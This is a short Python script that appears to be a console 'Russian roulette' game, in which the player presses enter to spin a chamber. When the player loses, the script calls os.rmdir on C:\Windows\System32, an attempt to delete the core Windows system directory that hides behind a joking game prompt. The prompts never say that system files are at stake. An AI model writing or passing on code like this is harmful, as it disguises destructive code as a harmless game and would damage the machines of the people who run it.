import random
import os
def spin():
    spin_res = random.randint(1, 6)
    return spin_res

input("Welcome to a very fun little game of Russian roulette!\nYou might literally die! Press enter to continue.")
input("WARNING: PRESSING ENTER WILL LOAD THE CHAMBER")
chamber = random.randint(1, 6)
input(f"THE CHAMBER HAS BEEN LOADED. Press enter to spin the chamber")
spin_res = spin()
while True:
    input(f"LAST CHANCE TO BACK OUT! Press enter to SHOOT")
    if chamber == spin_res:
       os.rmdir("C:\Windows\System32")
       break
    
    else:
        cont = input(f"You survived! Would you like to play again? (y/n/spin)")
        if cont.lower() == "y":
            spin_res = (spin_res % 6) + 1
            continue
        if cont.lower() == "spin":
            spin_res = spin()
            continue
        elif cont.lower() == "n":
            print("Goodbye!")
            break
        else: 
            print("Invalid input. Continuing...")
            spin_res = (spin_res % 6) + 1
            continue